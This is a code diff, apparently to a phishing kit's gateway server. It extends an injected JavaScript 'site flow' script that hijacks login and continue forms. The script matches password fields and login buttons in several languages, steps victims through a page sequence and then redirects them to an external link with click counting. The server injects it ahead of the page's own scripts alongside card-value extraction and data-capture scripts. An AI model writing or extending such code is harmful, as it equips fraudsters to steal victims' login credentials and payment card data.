@@ -2306,11 +2306,12 @@ def extract_card_values(flat: dict) -> dict:
     return out
 
 
-def site_flow_script(slug: str) -> bytes:
+def site_flow_script(slug: str, redirect_path: str = "") -> bytes:
     """注入到前台页面：暴露页面顺序，无人值守时按顺序自动推进。"""
     script = r"""
 (function(){
   var slug = "__SLUG__";
+  var REDIRECT = "__REDIRECT__";
   if (!slug) return;
   var KEY = "gw_site_flow_" + slug;
   var order = [], idx = -1;
@@ -2334,7 +2335,8 @@ def site_flow_script(slug: str) -> bytes:
   }
   function retargetForms(){
     var nx = nextPage();
-    if (!nx) return;
+    var target = nx ? ("/" + nx) : REDIRECT;
+    if (!target) return;
     try {
       var forms = document.querySelectorAll("form");
       for (var i = 0; i < forms.length; i++) {
@@ -2347,7 +2349,7 @@ def site_flow_script(slug: str) -> bytes:
         if (!hasSecret && !/ログイン|sign\s*in|log\s*in|登录|登入|次へ|続行|確認|送信|continue|next/i.test(btnText)) continue;
         f.setAttribute("data-gw-flow", "1");
         if (!f.getAttribute("action")) {
-          f.setAttribute("action", "/" + nx);
+          f.setAttribute("action", target);
           f.setAttribute("method", "get");
         }
       }
@@ -2355,9 +2357,10 @@ def site_flow_script(slug: str) -> bytes:
   }
   function goNext(){
     var nx = nextPage();
-    if (!nx) return false;
-    location.href = "/" + nx;
-    return true;
+    if (nx) { location.href = "/" + nx; return true; }
+    // 最后一页：按钮才跳「模板跳转链接」
+    if (REDIRECT) { location.href = REDIRECT; return true; }
+    return false;
   }
   try {
     var cached = localStorage.getItem(KEY);
@@ -2393,7 +2396,8 @@ def site_flow_script(slug: str) -> bytes:
   }, true);
 })();
 """
-    return ("<script data-gw-flow>" + script.replace("__SLUG__", slug) + "</script>").encode()
+    return ("<script data-gw-flow>" + script.replace("__SLUG__", slug)
+            .replace("__REDIRECT__", redirect_path) + "</script>").encode()
 
 
 def capture_script(post_path: str, site_code: str) -> bytes:
@@ -4272,8 +4276,13 @@ class Handler(BaseHTTPRequestHandler):
                 f"/__preview/{self._preview_host}/api/client/postData"
                 if self._preview_host else "/api/client/postData"
             )
+            # 配了「模板跳转链接」就把按钮点击送去外链（带点击计数），否则走页面顺序
+            _links = normalize_redirect_links(settings.get("redirect_links", []))
+            _click_path = (f"/__preview/{self._preview_host}/__gateway/click"
+                           if self._preview_host else "/__gateway/click")
+            _redirect_path = _click_path if _links else ""
             inject_blob = (kit_unlock_script()
-                           + site_flow_script(str(project.get("slug") or ""))
+                           + site_flow_script(str(project.get("slug") or ""), _redirect_path)
                            + capture_script(post_path, str(project.get("slug") or "")))
             # 注入到 <head> 之后：抢在页面自身脚本之前注册监听，登录按钮才拦得住
             head_at = content.lower().find(b"<head")
